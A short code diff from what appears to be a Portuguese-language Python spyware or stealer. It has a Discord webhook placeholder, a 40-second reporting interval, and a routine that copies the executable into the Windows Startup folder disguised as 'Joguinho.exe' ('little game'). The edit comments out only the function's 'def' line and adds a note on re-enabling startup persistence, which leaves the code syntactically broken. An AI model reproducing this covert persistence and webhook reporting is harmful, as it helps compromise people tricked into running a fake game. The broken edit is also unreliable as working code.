@@ -11,8 +11,8 @@ import subprocess
 # Configurações
 DC_WEBHOOK_URL = "URL DO DC AQUI"
 INTERVALO_SEGUNDOS = 40
-
-def adicionar_startup():
+#remova o # do def caso queira que .exe va para o startup
+#def adicionar_startup():
     app_path = sys.executable
     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
     startup_exe = os.path.join(startup_folder, 'Joguinho.exe')
